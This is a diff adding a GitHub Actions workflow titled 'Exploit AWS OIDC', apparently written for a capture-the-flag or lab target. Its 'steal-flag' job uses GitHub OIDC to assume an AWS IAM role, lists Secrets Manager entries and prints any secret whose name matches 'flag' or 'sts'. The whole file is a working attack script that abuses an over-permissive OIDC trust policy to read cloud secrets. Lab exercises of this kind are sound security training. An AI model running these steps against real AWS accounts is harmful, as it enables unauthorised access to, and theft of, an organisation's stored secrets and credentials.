@@ -1,0 +1,28 @@
+name: Exploit AWS OIDC
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+permissions:
+  id-token: write   # Required: allows GitHub to mint the OIDC JWT token
+  contents: read
+jobs:
+  steal-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assume Role via GitHub OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::556300512497:role/sts-lab-2-target
+          aws-region: us-east-1
+      - name: Verify Assumed Role Caller
+        run: |
+          aws sts get-caller-identity
+      - name: Discover and Retrieve Flag from Secrets Manager
+        run: |
+          echo "=== Listing Secrets ==="
+          aws secretsmanager list-secrets
+          echo "=== Retrieving Flag Secret ==="
+          SECRET_ARN=$(aws secretsmanager list-secrets --query "SecretList[?contains(Name, 'flag') || contains(Name, 'sts')].ARN" --output text)
+          echo "Target Secret ARN: $SECRET_ARN"
+          aws secretsmanager get-secret-value --secret-id "$SECRET_ARN" --query "SecretString" --output text
